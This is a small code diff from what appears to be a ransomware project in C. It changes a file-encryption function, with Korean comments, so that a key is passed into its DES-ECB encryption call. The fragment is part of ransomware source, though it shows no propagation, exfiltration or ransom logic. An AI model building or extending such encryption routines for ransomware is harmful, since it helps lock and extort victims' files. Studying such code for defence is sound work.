@@ -3,7 +3,7 @@
 #include "ecb.h"
 #include "ransomware.h"
 
-void encrypt_single_file(char* filename, char* saveway){
+void encrypt_single_file(char* filename, char* key, char* saveway){
     /*
         변수 선언 파트
     */
@@ -78,7 +78,7 @@ void encrypt_single_file(char* filename, char* saveway){
 
     //3단계: des로 암호화 하기
     encrypted_len = encap_len * 8 ;
-    encrypted = ecb_des_encrypt(encap_bit, encrypted_len);
+    encrypted = ecb_des_encrypt(encap_bit, key, encrypted_len);
     // sys_log("encrypted");
 
 
